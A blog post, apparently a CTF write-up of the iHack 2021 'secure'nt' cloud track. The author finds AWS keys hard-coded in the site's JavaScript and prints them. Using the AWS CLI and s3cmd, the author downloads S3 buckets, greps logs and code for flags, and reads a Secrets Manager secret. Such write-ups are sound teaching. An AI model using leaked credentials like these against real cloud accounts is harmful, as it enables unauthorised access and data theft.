---
layout: post
title: iHack 2021 Writeup - secure'nt
date: 2021-06-20
type: post
tags:
- Writeup
- Hacking
- iHack
- CTF
permalink: /2021/06/iHackWriteupSecureNt
img: 2021/06/iHack/SecureNt.png
---

The [iHack 2021 CTF](https://ihack.computer/#ctf) had a nice cloud track designed by @dax and @Brainmoustache. One of my teammate did the first flag. I did the second and fourth flag. 

```
secure'nt (@dax & @Brainmoustache)
│   ├── 1 - Hidding secrets (75)
│   ├── 2 - Building secure applications (125)
│   ├── 3 - Putting passwords in the right place (175)
│   ├── 4 - Centralizing data (175)
│   ├── 5 - Setting up authentication (250)
|   └── 6 - Proxying requests (300)
```

The challenge had a small web site that did not do anything. 

```
secure'nt | Secure your new technologies

Are you looking to move your old server right into the Cloud in a very secure way? We can help you with that! Visit our website for more information at https://securent.daxnbrain.ctf.ihack.computer/.

Flag format: ihack-[a-zA-Z\d]{32}
```

![secure'nt](/assets/images/2021/06/iHack/SecureNtSite.png "scure'nt")

## Flag 1 - Hidding secrets

As I mentioned earlier, this flag was found by my teammate [fil](https://lolkatz.github.io/will-hack-for-coffee/). He looked at the page source files. And the flag was hidden in the JavaScript.

```js
flag1:"ihack-z5GTbiHSE3FnO4kYL8bLDN3KSiErk1Ks"
```

He submitted that flag, then moved to other challenges. 

## Flag 4 - Centralizing data

When I got to the AWS track, I also started by looking at the source since the web site did not do anything. 

```js
g={data:function(){return{client:void 0,accessKeyId:"AKIASECYGINV6M2KYV5V",secretAccessKey:"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",bucket_name:"carousel-app-appbucketswatermarkedimagesbucketfce-f1drbai7iuy5",bucket_region:"us-east-1",flag1:"ihack-z5GTbiHSE3FnO4kYL8bLDN3KSiErk1Ks",bucket_prefix:"approved/",s3_delimiter:"/",signedImageUrlList:[],slideConfig:{slideNumber:0,slideInterval:5e3,backgroundColor:"#ffffff"}}}
```

I looked a little closer to where the first flag was and saw the credentials to an AWS S3 bucket. 

I did a little research on how to access a bucket without having access to the AWS console. The first thing I found is a tool called [s3cmd](https://makandracards.com/makandra/31999-browse-amazon-s3-buckets-with-ubuntu-linux). 

This showed me that I had access to a few different buckets. 

```bash
$ s3cmd ls
2021-06-04 12:58  s3://carousel-app-appbucketscloudtrailbackupbucket045b-mw1jg9q9p1w8
2021-06-04 12:58  s3://carousel-app-appbucketsdistributionbucketc2fc3d59-rexadq82h0yg
2021-06-04 12:58  s3://carousel-app-appbucketswatermarkedimagesbucketfce-f1drbai7iuy5
2021-06-04 12:58  s3://carousel-app-infra-source-image-bucket-146213847915
2021-06-04 12:58  s3://carousel-app-loggercloudtrailbucketdb8d265f-13etkhlt2ear6
2021-02-21 02:33  s3://cdktoolkit-stagingbucket-14vl3x42dyu3x
```

I looked at the first one, it contained some logs. I listed it, then installed [the AWS cli](https://docs.aws.amazon.com/cli/) to download the bucket content to my machine. 

```bash
$ s3cmd ls s3://carousel-app-appbucketscloudtrailbackupbucket045b-mw1jg9q9p1w8
                          DIR  s3://carousel-app-appbucketscloudtrailbackupbucket045b-mw1jg9q9p1w8/AWSLogs/
						  
$ aws s3 sync s3://carousel-app-appbucketscloudtrailbackupbucket045b-mw1jg9q9p1w8 logs                                              

download: s3://carousel-app-appbucketscloudtrailbackupbucket045b-mw1jg9q9p1w8/AWSLogs/146213847915/CloudTrail/us-east-1/2021/06/04/146213847915_CloudTrail_us-east-1_20210604T1305Z_e0TWkvsMrYwQJ8Mi.json.gz to logs/AWSLogs/146213847915/CloudTrail/us-east-1/2021/06/04/146213847915_CloudTrail_us-east-1_20210604T1305Z_e0TWkvsMrYwQJ8Mi.json.gz
download: s3://carousel-app-appbucketscloudtrailbackupbucket045b-mw1jg9q9p1w8/AWSLogs/146213847915/CloudTrail/us-east-1/2021/06/04/146213847915_CloudTrail_us-east-1_20210604T1300Z_Jb4unUKF7eB47wPl.json.gz to logs/AWSLogs/146213847915/CloudTrail/us-east-1/2021/06/04/146213847915_CloudTrail_us-east-1_20210604T1300Z_Jb4unUKF7eB47wPl.json.gz
download: s3://carousel-app-appbucketscloudtrailbackupbucket045b-mw1jg9q9p1w8/AWSLogs/146213847915/CloudTrail/us-east-1/2021/06/04/146213847915_CloudTrail_us-east-1_20210604T1300Z_99UyfVrCV5vSCV1G.json.gz to logs/AWSLogs/146213847915/CloudTrail/us-east-1/2021/06/04/146213847915_CloudTrail_us-east-1_20210604T1300Z_99UyfVrCV5vSCV1G.json.gz
...
```

Once the logs where downloaded, I uncompressed them, then grepped for the word flag in the logs. 

```bash
$ cd logs/AWSLogs/146213847915/CloudTrail/us-east-1/2021/06/04 

$ gunzip *.gz

$ grep -Ri flag .
./146213847915_CloudTrail_us-east-1_20210604T1310Z_LxVmyiHzpDeSDX9d.json:
...
"FLAG4", "value": "ihack-cUsRM4GDZwIFvtItKewpxuAvb7H4jm1a"}, 
...
```

The fourth flag was hidden in one of the log files. 

## Flag 2 - Building secure applications

After flag 4, I kept looking at the other buckets. One of them contained the source code to the application.

```bash
$ aws s3 sync s3://carousel-app-appbucketsdistributionbucketc2fc3d59-rexadq82h0yg code
download: s3://carousel-app-appbucketsdistributionbucketc2fc3d59-rexadq82h0yg/.gitignore to code/.gitignore
download: s3://carousel-app-appbucketsdistributionbucketc2fc3d59-rexadq82h0yg/client/dist/css/app.e394e790.css to code/client/dist/css/app.e394e790.css
download: s3://carousel-app-appbucketsdistributionbucketc2fc3d59-rexadq82h0yg/buildspec.yml to code/buildspec.yml
download: s3://carousel-app-appbucketsdistributionbucketc2fc3d59-rexadq82h0yg/Pipfile to code/Pipfile
download: s3://carousel-app-appbucketsdistributionbucketc2fc3d59-rexadq82h0yg/README.md to code/README.md
download: s3://carousel-app-appbucketsdistributionbucketc2fc3d59-rexadq82h0yg/Pipfile.lock to code/Pipfile.lock
...
```

After the code was downloaded, I grepped for the word flag another time. The flag was in a comment at the beginning of the `buildspec.yml` file. 

```bash
$ grep -Ri flag .
...
/code/buildspec.yml:# FLAG2: ihack-wWMsmNxTYw0Cqj4WxloSpz8OhWm6UNAR
```

I submitted that flag, then started looking at the source code, but failed to find any other flags.

## Flag 3 - Putting passwords in the right place

As stated earlier, I did not get this flag during the CTF. But I got close, and Brainmoustache and dax gave the solution after it was over, so I think it's worth documenting it. 

The source code came with an architecture diagram.

![Architecture Diagram](/assets/images/2021/06/iHack/Diagram.png "Architecture Diagram")

The challenge name is about putting passwords where they belong. And the diagram shows that it's using Secret manager. So I started to look about accessing it with the credentials I had.

I tried to list the secrets. 

```bash
$ aws secretsmanager list-secrets
```

But it gave me an error saying that my user was not authorized to list the secrets. Next I tried to guess the secret ID. 

```bash
aws secretsmanager get-secret-value --secret-id password
aws secretsmanager get-secret-value --secret-id VUE_APP_FLAG1 
aws secretsmanager get-secret-value --secret-id VUE_APP_BUCKET_NAME
...
```

Nothing worked. I always got an access denied. 

I went back to the source code. I found that the file `watermark.py` was using assume role to elevate it's permissions. I tried doing the same thing. 

```
$ aws sts assume-role --role-arn carousel-app-infra-role-secret:role_arn --role-session-name test

An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:iam::146213847915:user/dev-user is not authorized to perform: sts:AssumeRole on resource: carousel-app-infra-role-secret:role_arn
```

Access denied again. I looked at the code, the logs and the other buckets over and over without finding anything. I also tried to modify the code and push it, but I did not have permission to write in any bucket. So after a while, I left this aside and moved to another track. 

After the competition was over,  the solution was posted in Discord. The secret id was in `buildspec.yml`, it was the role I was trying to impersonate. 

```yml
  secrets-manager:
    # ToDo: Review Secretsmanager access
    INVOKE_API_ROLE: carousel-app-infra-role-secret:role_arn
```


I could have used that as the secret id in the AWS cli, and get the third flag. 

```bash
$ aws secretsmanager get-secret-value --secret-id carousel-app-infra-role-secret --region us-east-1
{
    "ARN": "arn:aws:secretsmanager:us-east-1:146213847915:secret:carousel-app-infra-role-secret-RhnoAr",
    "Name": "carousel-app-infra-role-secret",
    "VersionId": "fc3eacfe-d5bb-4a31-a28a-f1272b302c9c",
    "SecretString": "{\"role_arn\":\"arn:aws:iam::146213847915:role/carousel-app-CiCdInvokeApiRole56EA5614-AFECOPL6148K\",\"flag3\":\"ihack-zs3h7zJHZoiPmys30oE6RPXo9w5sbgIh\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1622811586.261
}
```
